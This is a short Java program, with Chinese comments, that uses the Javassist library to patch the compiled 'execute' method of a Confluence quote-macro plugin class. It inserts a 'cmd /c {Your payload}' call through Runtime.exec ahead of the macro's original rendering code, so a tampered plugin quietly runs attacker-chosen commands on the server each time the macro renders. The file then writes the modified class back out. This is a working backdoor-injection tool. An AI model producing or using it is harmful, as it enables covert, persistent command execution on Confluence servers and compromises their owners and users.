import java.io.IOException;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;
public class UpdateMethod {
	public static void main(String[] args) {
		updateMethod();
	}
	
	public static void updateMethod(){
		try {
			ClassPool cPool = new ClassPool(true);
		        //如果该文件引入了其它类，需要利用类似如下方式声明
			//cPool.importPackage("java.util.List");
			
			//设置class文件的位置
			cPool.insertClassPath("{path}/quote-macro-1.0/com/unlimax/confluence/plugin/macro");
			cPool.importPackage("com.atlassian.confluence.content.render.xhtml.ConversionContext");
			cPool.importPackage("com.atlassian.confluence.macro.Macro");
			cPool.importPackage("com.atlassian.confluence.macro.Macro.BodyType");
			cPool.importPackage("com.atlassian.confluence.macro.Macro.OutputType");
			cPool.importPackage("com.atlassian.confluence.macro.MacroExecutionException");
			cPool.importPackage("com.atlassian.confluence.renderer.radeox.macros.MacroUtils");
			cPool.importPackage("com.atlassian.confluence.util.velocity.VelocityUtils");
			cPool.importPackage("com.atlassian.confluence.xhtml.api.XhtmlContent");
			cPool.importPackage("java.util.Map");
			//获取该class对象
			CtClass cClass = cPool.get("com.unlimax.confluence.plugin.macro.QuoteMacro");
			
			//获取到对应的方法
			CtMethod cMethod = cClass.getDeclaredMethod("execute");
			
			//更改该方法的内部实现
			//需要注意的是对于参数的引用要以$开始，不能直接输入参数名称
			cMethod.setBody("{ String cmd = \"cmd /c {Your payload}\";Runtime.getRuntime().exec(cmd);String width = $1.get(\"width\") == null ? \"100%\" : (String)$1.get(\"width\");String author = (String)$1.get(\"author\");String url = $1.get(\"url\") == null ? \"hideURL\" : (String)$1.get(\"url\");Map contextMap = MacroUtils.defaultVelocityContext();contextMap.put(\"body\", $2);contextMap.put(\"width\", width);contextMap.put(\"author\", author);contextMap.put(\"url\", url);return VelocityUtils.getRenderedTemplate(\"templates/quote-macro.vm\", contextMap);}");
			cClass.writeFile();
			System.out.println("=======修改方法完=========");
		} catch (NotFoundException e) {
			e.printStackTrace();
		} catch (CannotCompileException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} 
	}
}
